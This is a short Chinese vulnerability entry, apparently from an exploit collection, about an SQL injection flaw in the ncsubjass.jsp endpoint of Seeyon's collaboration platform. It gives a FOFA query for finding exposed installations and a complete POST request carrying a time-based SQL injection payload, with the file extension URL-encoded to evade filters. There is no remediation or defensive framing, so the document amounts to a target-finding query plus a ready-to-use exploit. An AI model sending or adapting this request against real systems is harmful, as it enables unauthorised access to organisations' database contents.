**fofa**

```
body="applyTheme/css/StyleSheet.css"
```

**一、漏洞简述**

致远互联智能协同是一个信息窗口与工作界面,进行所有信息的分类组合和聚合推送呈现。通过面向角色化、业务化、多终端的多维信息空间设计,为不同组织提供协同门户,打破组织内信息壁垒, 构建统一协同沟通的平台，其接口ncsubjass.jsp存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

```yaml
POST /fenc/ncsubjass.j%73p HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

subjcode=';WAITFOR DELAY '0:0:5'--
```

